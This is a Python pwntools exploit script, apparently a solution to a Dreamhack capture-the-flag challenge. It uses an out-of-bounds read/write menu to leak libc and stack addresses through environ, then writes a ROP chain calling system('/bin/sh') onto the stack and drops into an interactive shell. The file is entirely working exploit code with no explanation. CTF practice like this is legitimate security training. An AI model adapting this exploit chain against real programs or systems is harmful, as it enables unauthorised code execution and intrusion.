from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 24077
r = remote(HOST, PORT)

def read(offset):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(offset).encode())

def write(offset, value):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(offset).encode())
    r.sendlineafter(b': ', str(value).encode())

def exit():
    r.sendlineafter(b'> ', b'3')

libc = 0
for i in range(6):
    read(16+i)
    libc |= (u8(r.recvline().strip()) << 8 *i)
libc -= 0x21a780
environ = libc + 0x221200

oob = 0
for i in range(6):
    read(-8+i)
    oob |= (u8(r.recvline().strip()) << 8*i)
oob += 8

stack = 0
for i in range(6):
    read(environ - oob + i)
    stack |= (u8(r.recvline().strip()) << 8*i)
stack -= 0x120

system = libc + 0x50d60
binsh = libc + 0x1d8698
pop_rdi = libc + 0x2a3e5
ret = libc + 0x29cd6

write(stack - oob, ret)
write(stack - oob + 8*1, pop_rdi)
write(stack - oob + 8*2, binsh)
write(stack - oob + 8*3, system)

exit()

r.interactive()